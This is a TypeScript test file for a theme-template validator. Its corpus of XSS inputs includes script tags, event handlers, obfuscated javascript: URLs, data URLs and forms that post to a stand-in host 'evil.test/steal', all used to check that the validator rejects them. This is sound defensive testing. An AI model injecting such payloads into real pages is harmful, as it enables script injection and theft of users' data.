import { describe, expect, test } from "bun:test";
import {
  formatTemplateIssues,
  maskLiquid,
  type TemplateIssueCode,
  validateTemplateMarkup,
} from "./validate.ts";

interface CorpusCase {
  readonly name: string;
  readonly template: string;
  readonly code: TemplateIssueCode;
  readonly element: string;
  readonly attribute?: string;
}

/**
 * The XSS corpus for the theme profile (ADR 0008, task 2.2). Every construct the spec names
 * has a case here, including the obfuscations a browser still executes.
 */
const REJECTED: readonly CorpusCase[] = [
  {
    name: "script element",
    template: '<div>{% island "Counter" %}</div><script>alert(1)</script>',
    code: "script",
    element: "script",
  },
  {
    name: "svg script element",
    template: "<svg><script>alert(1)</script></svg>",
    code: "script",
    element: "script",
  },
  {
    name: "script inside a template element",
    template: "<template><script>alert(1)</script></template>",
    code: "script",
    element: "script",
  },
  {
    name: "script inside noscript",
    template: "<noscript><script>alert(1)</script></noscript>",
    code: "script",
    element: "script",
  },
  {
    name: "iframe",
    template: '<iframe src="https://evil.test"></iframe>',
    code: "frame",
    element: "iframe",
  },
  {
    name: "frameset",
    template: '<frameset><frame src="/x"></frameset>',
    code: "frame",
    element: "frameset",
  },
  {
    name: "object",
    template: '<object data="/x.swf"></object>',
    code: "object",
    element: "object",
  },
  {
    name: "embed",
    template: '<embed src="/x.swf">',
    code: "embed",
    element: "embed",
  },
  {
    name: "base",
    template: '<base href="https://evil.test/">',
    code: "base",
    element: "base",
  },
  {
    name: "meta refresh",
    template: '<meta http-equiv="Refresh" content="0;url=https://evil.test">',
    code: "meta_refresh",
    element: "meta",
    attribute: "http-equiv",
  },
  {
    name: "onclick handler",
    template: '<div onclick="alert(1)">x</div>',
    code: "event_handler",
    element: "div",
    attribute: "onclick",
  },
  {
    name: "onerror handler",
    template: '<img src="/x.png" onerror="alert(1)">',
    code: "event_handler",
    element: "img",
    attribute: "onerror",
  },
  {
    name: "mixed-case onmouseover",
    template: '<a OnMouseOver="alert(1)">x</a>',
    code: "event_handler",
    element: "a",
    attribute: "onmouseover",
  },
  {
    name: "javascript URL",
    template: '<a href="javascript:alert(1)">x</a>',
    code: "unsafe_url",
    element: "a",
    attribute: "href",
  },
  {
    name: "mixed-case and padded javascript URL",
    template: '<a href=" JaVaScRiPt:alert(1)">x</a>',
    code: "unsafe_url",
    element: "a",
    attribute: "href",
  },
  {
    name: "tab-obfuscated javascript URL",
    template: '<a href="java&#x09;script:alert(1)">x</a>',
    code: "unsafe_url",
    element: "a",
    attribute: "href",
  },
  {
    name: "entity-encoded colon",
    template: '<a href="javascript&colon;alert(1)">x</a>',
    code: "unsafe_url",
    element: "a",
    attribute: "href",
  },
  {
    name: "data URL in src",
    template: '<img src="data:text/html;base64,PHNjcmlwdD4=">',
    code: "unsafe_url",
    element: "img",
    attribute: "src",
  },
  {
    name: "data URL in srcset",
    template: '<img srcset="data:image/png;base64,AAAA 1x">',
    code: "unsafe_url",
    element: "img",
    attribute: "srcset",
  },
  {
    name: "vbscript URL in an svg link",
    template: '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
    code: "unsafe_url",
    element: "a",
    attribute: "xlink:href",
  },
  {
    name: "form posting off origin",
    template: '<form action="https://evil.test/steal" method="post"></form>',
    code: "off_origin_form",
    element: "form",
    attribute: "action",
  },
  {
    name: "protocol-relative form action",
    template: '<form action="//evil.test/steal"></form>',
    code: "off_origin_form",
    element: "form",
    attribute: "action",
  },
  {
    name: "backslash-relative form action",
    template: '<form action="\\\\evil.test/steal"></form>',
    code: "off_origin_form",
    element: "form",
    attribute: "action",
  },
  {
    name: "off-origin formaction on a button",
    template: '<button formaction="https://evil.test/steal">x</button>',
    code: "off_origin_form",
    element: "button",
    attribute: "formaction",
  },
  {
    name: "filesystem include",
    template: '<div>{% include "package.json" %}</div>',
    code: "unsupported_tag",
    element: "include",
  },
  {
    name: "whitespace-trimmed render tag",
    template: "{%- render 'secret' -%}",
    code: "unsupported_tag",
    element: "render",
  },
  {
    name: "layout tag",
    template: '{% layout "secret" %}',
    code: "unsupported_tag",
    element: "layout",
  },
];

describe("validateTemplateMarkup", () => {
  for (const corpusCase of REJECTED) {
    test(`rejects ${corpusCase.name}`, () => {
      const result = validateTemplateMarkup(corpusCase.template);

      expect(result.ok).toBe(false);

      const issue = result.issues.find((candidate) => candidate.code === corpusCase.code);

      if (issue === undefined) {
        throw new Error(
          `expected a ${corpusCase.code} issue, received ${JSON.stringify(result.issues)}`,
        );
      }

      expect(issue.element).toBe(corpusCase.element);

      if (corpusCase.attribute !== undefined) {
        expect(issue.attribute).toBe(corpusCase.attribute);
        expect(issue.message).toContain(corpusCase.attribute);
      }

      expect(issue.line).toBeGreaterThanOrEqual(1);
      expect(issue.column).toBeGreaterThanOrEqual(1);
    });
  }

  test("names the attribute and the line so an admin can fix the template", () => {
    const result = validateTemplateMarkup(
      '<section>\n  <h1>Title</h1>\n  <div onclick="steal()">Click</div>\n</section>',
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toHaveLength(1);

    const issue = result.issues[0];

    expect(issue?.code).toBe("event_handler");
    expect(issue?.attribute).toBe("onclick");
    expect(issue?.line).toBe(3);
    expect(formatTemplateIssues(result.issues)).toContain("line 3: the onclick attribute");
    expect(formatTemplateIssues(result.issues)).toContain("<div>");
  });

  test("accepts the default theme's safe markup, islands, hooks and Liquid expressions", () => {
    const template = `<article class="page" data-theme="{{ theme }}">
  <h1>{% t "page.title" %}</h1>
  {% if flags.editor %}<a href="/topic/{{ topic.id }}" title="{{ topic.title }}">Open</a>{% endif %}
  {% for item in items %}<p>{{ item.label }}</p>{% endfor %}
  {% island "SpikeCounter" island %}
  {% hook "post.userbar.after" %}
  <form action="/topic/{{ topic.id }}/reply" method="post">
    <button formaction="?page=2">Next</button>
  </form>
</article>`;

    expect(validateTemplateMarkup(template).issues).toEqual([]);
    expect(validateTemplateMarkup(template).ok).toBe(true);
  });

  test("does not treat Liquid syntax as HTML", () => {
    expect(validateTemplateMarkup("{% if a < b %}<p>less</p>{% endif %}").ok).toBe(true);
    expect(validateTemplateMarkup("{{ '<script>' }}").ok).toBe(true);
    expect(
      validateTemplateMarkup('<a href="{% if secure %}/a{% else %}/b{% endif %}">x</a>').ok,
    ).toBe(true);
    // ...but literal markup inside {% raw %} is still static output.
    expect(validateTemplateMarkup("{% raw %}<script>x</script>{% endraw %}").issues[0]?.code).toBe(
      "script",
    );
  });
});

describe("maskLiquid", () => {
  test("preserves length, line numbers and plain markup", () => {
    const source = '<p>{% if a > b %}{{ name }}</p>\n<span onclick="x">y</span>';
    const masked = maskLiquid(source);

    expect(masked.length).toBe(source.length);
    expect(masked.split("\n")).toHaveLength(source.split("\n").length);
    expect(masked).toContain("<p>");
    expect(masked).toContain("</p>");
    expect(masked).toContain("<span ");
    expect(masked).not.toContain("{%");
    expect(masked).not.toContain("{{");
  });

  test("keeps delimiters inside quoted tag arguments", () => {
    const source = '{% t "a%}b" %}<p>{{ "}}" }}</p>';
    const masked = maskLiquid(source);

    expect(masked).toContain("<p>");
    expect(masked).toContain("</p>");
    expect(masked).not.toContain("%}");
    expect(masked).not.toContain("}}");
  });
});
